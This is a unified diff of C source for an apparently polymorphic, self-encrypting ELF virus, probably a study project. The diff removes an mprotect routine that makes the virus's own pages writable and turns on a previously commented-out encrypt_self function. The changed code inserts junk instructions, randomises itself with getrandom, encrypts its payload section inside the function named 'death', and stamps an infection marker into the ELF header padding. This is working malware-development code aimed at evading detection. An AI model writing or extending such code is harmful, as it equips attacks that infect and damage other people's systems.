@@ -12,7 +12,6 @@
 
 extern void __attribute__((naked)) _start(void);
 extern void real_end(void);
-extern bool g_is_encrypted;
 extern int g_start_offset;
 extern uint8_t g_key[KEY_SIZE];
 extern void real_start(void);
@@ -291,29 +290,9 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 	}
 }
 
-int make_writeable(uint8_t *self, size_t size) {
-
-	if (g_start_offset == ORIG_TEXT_OFF && g_is_encrypted == true) {
-		return 0;
-	}
-
-	uintptr_t start = (uintptr_t)self;
-	uintptr_t end = start + size; JUNK;
-
-	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
-	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
-
-	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
-		return -1;
-	}
-	return 0;
-}
-
 void prepare_mutate(void) {
 
 	uintptr_t start = (uintptr_t)&_start;
-
-	make_writeable((uint8_t *)start, VIRUS_SIZE);
 
 	getrandom(g_rand, RAND_SIZE, 0);
 
@@ -343,42 +322,33 @@ static void write_self_pos(uint8_t *entry) {
 	*(uint8_t *)(entry + G_NB_JUNK_OFF) = g_nb_junk;
 }
 
-#define G_IS_ENCRYPTED_OFF (uintptr_t)&g_is_encrypted - (uintptr_t)&_start
-#define G_KEY_OFF (uintptr_t)&g_key - (uintptr_t)&_start
+#define G_IM_ENCRYPTED_OFF (uintptr_t)&g_im_encrypted - (uintptr_t)&_start
+#define G_CRYPT_PARAMS_OFF (uintptr_t)&g_params - (uintptr_t)&_start
 
-//static uint8_t* encrypt_self(uint8_t *entry) {
-//
-//	/* encrypt self */
-//	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
-//	getrandom(key, KEY_SIZE, 0);
-//
-//	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
-//
-//	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
-//	*enc = true; JUNK;
-//
-//	return key;
-//}
+static int encrypt_self(uint8_t *entry) {
 
-int death(crypt_params_t *saved, int offset, file_t *file, bool is_encrypted) {
+	/* encrypt self */
+	crypt((uint8_t *)(entry + PACKER_SIZE), PAYLOAD_SIZE, 0);
+
+	*(crypt_params_t *)(entry + G_CRYPT_PARAMS_OFF) = g_params;
+
+	*(uint8_t *)(entry + G_IM_ENCRYPTED_OFF) = true;
+
+	return 0;
+}
+
+int death(int offset, file_t *file, bool is_encrypted) {
 
 	uint8_t *self = (uint8_t *)file->view.data; JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
-	(void)saved;
 
 	uint8_t *entry = self + offset;
 
-	if (is_encrypted == true) {
-		//uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
-		//getrandom(key, KEY_SIZE, 0);
-		//decrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, vars->key);
-		//replace_nop(entry, g_junk_offsets);
-		//encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
-	} else { // only for the first run of the main prog (like fill_offsets)
+	if (is_encrypted == false) {
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
-		//encrypt_self(entry);
+		encrypt_self(entry);
 		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
 	}
 
